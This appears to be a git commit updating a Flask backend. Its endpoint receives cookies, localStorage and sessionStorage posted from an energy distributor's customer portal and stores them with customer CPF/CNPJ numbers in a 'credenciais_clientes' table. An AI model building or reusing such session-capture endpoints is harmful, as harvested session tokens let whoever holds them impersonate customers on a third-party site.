aeb2526cc73f0b5d6534428e6e9d593c6c7993a9
enzorooschqueiroz <enzoroosch@gmail.com>
2025-04-22 17:49:22 -0300

    Update docker-compose and wsgi configuration for Supabase integration and CORS settings

--- wsgi.py
+++ wsgi.py
@@ -1,21 +1,31 @@
 import os 
-import asyncio
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 from supabase import create_client, Client
 
-from flask_cors import CORS
-
-app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "https://pi.equatorialenergia.com.br"}})
-
-# API Flask
+# Criação da aplicação Flask
 app = Flask(__name__)
 
-SUPABASE_URL= os.environ.get("SUPABASE_URL")
-SUPABASE_KEY= os.environ.get("SUPABASE_KEY") 
+# Configuração do CORS
+CORS(app, 
+     origins="https://pi.equatorialenergia.com.br",
+     supports_credentials=True,
+     allow_headers=["Content-Type", "Authorization"],
+     methods=["GET", "POST", "OPTIONS"])
+
+@app.after_request
+def after_request(response):
+    response.headers.add('Access-Control-Allow-Origin', 'https://pi.equatorialenergia.com.br')
+    response.headers.add('Access-Control-Allow-Credentials', 'true')
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
+    response.headers.add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')
+    return response
+
+# Conexão com o Supabase
+SUPABASE_URL = os.environ.get("SUPABASE_URL")
+SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
-    
 @app.route('/salvar-sessao', methods=['POST'])
 def salvar_sessao():
     data = request.get_json()
@@ -24,17 +34,17 @@ def salvar_sessao():
         return jsonify({'erro': 'JSON inválido'}), 400
 
     try:
-        insert_data = {  # Gera um UUID novo
+        insert_data = {
             'cnpj_cpf': data.get('cpf'),
             'email_data': data.get('email_data', ''),
             'estado': data.get('estado', ''),
-            'ucs': data.get('uc', []),  # Espera array
+            'ucs': data.get('uc', []),
             'tipo': data.get('tipo'),
             'distribuidora': data.get('distribuidora'),
             'cookies': data.get('cookies'),
             'local_storage': data.get('localStorage'),
             'session_storage': data.get('sessionStorage'),
-            'ativo': False  # Inicialmente inativo
+            'ativo': False
         }
 
         result = supabase.table('credenciais_clientes').insert(insert_data).execute()
@@ -46,7 +56,6 @@ def salvar_sessao():
 
     except Exception as e:
         return jsonify({'erro': str(e)}), 500
-    
 
 @app.route("/check", methods=["GET"])
 def check():
